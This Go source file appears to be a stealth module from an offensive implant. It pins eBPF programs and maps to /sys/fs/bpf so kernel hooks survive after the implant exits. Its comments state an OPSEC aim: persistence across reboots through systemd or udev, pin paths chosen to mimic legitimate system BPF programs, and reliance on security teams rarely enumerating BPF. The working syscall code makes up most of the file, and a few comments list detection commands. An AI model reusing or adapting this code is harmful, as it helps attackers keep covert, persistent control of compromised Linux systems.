package stealth

// eBPF Program Pinning — Persistent Kernel Hooks
//
// OPSEC rationale: eBPF programs normally die with their creating process.
// By pinning them to the bpffs virtual filesystem (/sys/fs/bpf/), programs
// survive process death and system reboots (if bpffs is mounted at boot).
//
// Pinned eBPF programs continue running in the kernel even after the
// implant exits. This enables:
//   - Network packet filters that persist across process restarts
//   - Syscall hooks (via tracepoints) that outlive the implant
//   - XDP programs for high-performance packet manipulation
//   - Cgroup hooks for container-aware filtering
//
// The pin path should look legitimate:
//   - /sys/fs/bpf/xdp_dispatch     (looks like an XDP program)
//   - /sys/fs/bpf/tc/globals/cls   (looks like a TC classifier)
//   - /sys/fs/bpf/cgroup/sock_ops  (looks like a cgroup hook)
//
// For boot persistence, combine with a systemd service or udev rule
// that runs `bpftool prog loadall` on the pinned programs.
//
// Capability: CAP_BPF + CAP_SYS_ADMIN (or CAP_NET_ADMIN for network progs)
// Kernel: 4.4+ (bpffs), 5.7+ (CAP_BPF separation)
//
// Detection:
//   - `bpftool prog list` shows all loaded BPF programs
//   - `ls /sys/fs/bpf/` shows pinned programs
//   - `bpftool prog dump` can inspect program bytecode
//   - Most SOCs don't routinely enumerate BPF programs

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// BPF command constants (only those not already in ebpf_cloak.go).
const (
	bpfObjPin        = 6  // BPF_OBJ_PIN
	bpfObjGet        = 7  // BPF_OBJ_GET
	bpfProgGetNextID = 11 // BPF_PROG_GET_NEXT_ID
	bpfMapGetNextID  = 12 // BPF_MAP_GET_NEXT_ID
	bpfProgGetFDByID = 13 // BPF_PROG_GET_FD_BY_ID
	bpfMapGetFDByID  = 14 // BPF_MAP_GET_FD_BY_ID

	// BPF program types (not in ebpf_cloak.go)
	bpfProgTypeSocketFilter = 1
	bpfProgTypeKprobe       = 2
	bpfProgTypeTracepoint   = 5
	bpfProgTypeXDP          = 6
	bpfProgTypeCgroupSock   = 11

	// BPF map types (not in ebpf_cloak.go)
	bpfMapTypeArray  = 2
	bpfMapTypePerCPU = 6 // BPF_MAP_TYPE_PERCPU_HASH
)

// BPFPinManager manages pinned eBPF programs and maps.
type BPFPinManager struct {
	mu      sync.Mutex
	pinBase string   // base directory for pins (e.g., /sys/fs/bpf)
	pins    []string // list of pinned paths for cleanup
}

// Innocuous pin paths that blend with system BPF programs.
var BPFPinPaths = []string{
	"/sys/fs/bpf/xdp_dispatch",
	"/sys/fs/bpf/tc/globals/classifier",
	"/sys/fs/bpf/cgroup/sock_filter",
	"/sys/fs/bpf/ip/nat_table",
	"/sys/fs/bpf/sk/sk_lookup",
}

// NewBPFPinManager creates a manager for pinned BPF objects.
func NewBPFPinManager(pinBase string) *BPFPinManager {
	if pinBase == "" {
		pinBase = "/sys/fs/bpf"
	}
	return &BPFPinManager{
		pinBase: pinBase,
		pins:    make([]string, 0),
	}
}

// bpfAttrObjPin is the kernel's bpf_attr for BPF_OBJ_PIN / BPF_OBJ_GET.
// Must match kernel struct layout exactly (padded to 120 bytes minimum).
type bpfAttrObjPin struct {
	pathname uint64 // pointer to pin path
	bpfFD    uint32 // fd of program/map to pin
	pad0     uint32
}

// bpfAttrMapCreate is the kernel's bpf_attr for BPF_MAP_CREATE.
type bpfAttrMapCreate struct {
	mapType    uint32
	keySize    uint32
	valueSize  uint32
	maxEntries uint32
	mapFlags   uint32
}

// PinFD pins an existing BPF program or map fd to the bpffs filesystem.
// The pinned object survives process death.
func (pm *BPFPinManager) PinFD(fd int, pinPath string) error {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	// Ensure parent directory exists
	dir := filepath.Dir(pinPath)
	if err := os.MkdirAll(dir, 0700); err != nil {
		return fmt.Errorf("mkdir %s: %v", dir, err)
	}

	pathBytes := []byte(pinPath + "\x00")

	attr := bpfAttrObjPin{
		pathname: uint64(uintptr(unsafe.Pointer(&pathBytes[0]))),
		bpfFD:    uint32(fd),
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		bpfObjPin,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(pathBytes)
	if errno != 0 {
		return fmt.Errorf("BPF_OBJ_PIN %s: %v", pinPath, errno)
	}

	pm.pins = append(pm.pins, pinPath)
	return nil
}

// GetPinned retrieves a previously pinned BPF program or map by path.
// Returns an fd that can be used for further operations.
func (pm *BPFPinManager) GetPinned(pinPath string) (int, error) {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	pathBytes := []byte(pinPath + "\x00")

	attr := bpfAttrObjPin{
		pathname: uint64(uintptr(unsafe.Pointer(&pathBytes[0]))),
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfObjGet,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	runtime.KeepAlive(pathBytes)
	if errno != 0 {
		return -1, fmt.Errorf("BPF_OBJ_GET %s: %v", pinPath, errno)
	}

	return int(fd), nil
}

// Unpin removes a pinned BPF object. The program/map continues running
// if other references exist (attached to hooks, open fds), but won't
// survive the last reference being closed.
func (pm *BPFPinManager) Unpin(pinPath string) error {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	if err := os.Remove(pinPath); err != nil {
		return fmt.Errorf("unpin %s: %v", pinPath, err)
	}

	// Remove from our tracking list
	for i, p := range pm.pins {
		if p == pinPath {
			pm.pins = append(pm.pins[:i], pm.pins[i+1:]...)
			break
		}
	}
	return nil
}

// UnpinAll removes all pinned objects managed by this instance.
func (pm *BPFPinManager) UnpinAll() {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	for _, p := range pm.pins {
		os.Remove(p)
	}
	pm.pins = pm.pins[:0]
}

// CreateMap creates a BPF map that can be shared between programs.
// Pin it to bpffs for persistence. Returns the map fd.
func (pm *BPFPinManager) CreateMap(mapType, keySize, valueSize, maxEntries uint32) (int, error) {
	attr := bpfAttrMapCreate{
		mapType:    mapType,
		keySize:    keySize,
		valueSize:  valueSize,
		maxEntries: maxEntries,
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfMapCreate,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	if errno != 0 {
		return -1, fmt.Errorf("BPF_MAP_CREATE: %v", errno)
	}

	return int(fd), nil
}

// CreateAndPinMap creates a map and immediately pins it.
func (pm *BPFPinManager) CreateAndPinMap(mapType, keySize, valueSize, maxEntries uint32, pinPath string) (int, error) {
	fd, err := pm.CreateMap(mapType, keySize, valueSize, maxEntries)
	if err != nil {
		return -1, err
	}

	if err := pm.PinFD(fd, pinPath); err != nil {
		syscall.Close(fd)
		return -1, err
	}

	return fd, nil
}

// ListPins returns all paths pinned by this manager.
func (pm *BPFPinManager) ListPins() []string {
	pm.mu.Lock()
	defer pm.mu.Unlock()

	result := make([]string, len(pm.pins))
	copy(result, pm.pins)
	return result
}

// EnumerateProgs lists all BPF program IDs currently loaded in the kernel.
// Useful for finding existing programs to reattach to.
func EnumerateProgs() ([]uint32, error) {
	var ids []uint32
	var startID uint32

	for {
		nextID, err := getNextProgID(startID)
		if err != nil {
			break // no more programs
		}
		ids = append(ids, nextID)
		startID = nextID
	}

	return ids, nil
}

// getNextProgID wraps BPF_PROG_GET_NEXT_ID.
func getNextProgID(startID uint32) (uint32, error) {
	// bpf_attr for GET_NEXT_ID: just start_id at offset 0
	attr := struct {
		startID uint32
		nextID  uint32
	}{
		startID: startID,
	}

	_, _, errno := syscall.Syscall(
		sysBPF,
		bpfProgGetNextID,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	if errno != 0 {
		return 0, errno
	}

	return attr.nextID, nil
}

// GetProgFDByID gets an fd for a BPF program by its ID.
func GetProgFDByID(progID uint32) (int, error) {
	attr := struct {
		progID uint32
	}{
		progID: progID,
	}

	fd, _, errno := syscall.Syscall(
		sysBPF,
		bpfProgGetFDByID,
		uintptr(unsafe.Pointer(&attr)),
		unsafe.Sizeof(attr),
	)
	if errno != 0 {
		return -1, fmt.Errorf("BPF_PROG_GET_FD_BY_ID %d: %v", progID, errno)
	}

	return int(fd), nil
}

// BPFfsAvailable checks if bpffs is mounted and writable.
func BPFfsAvailable() bool {
	// Check if /sys/fs/bpf exists and is a bpf filesystem
	var stat syscall.Statfs_t
	if err := syscall.Statfs("/sys/fs/bpf", &stat); err != nil {
		return false
	}
	// BPF_FS_MAGIC = 0xcafe4a11
	return stat.Type == 0xcafe4a11
}

// BPFSyscallAvailable checks if the bpf() syscall is functional.
func BPFSyscallAvailable() bool {
	// Try BPF_PROG_GET_NEXT_ID with start_id=0 — should work or return
	// ENOENT (no programs), not ENOSYS (syscall missing) or EPERM.
	_, err := getNextProgID(0)
	if err == nil {
		return true
	}
	// ENOENT means syscall works but no programs loaded
	if err == syscall.ENOENT {
		return true
	}
	// EPERM means syscall exists but we lack privileges
	if err == syscall.EPERM {
		return true
	}
	return false
}
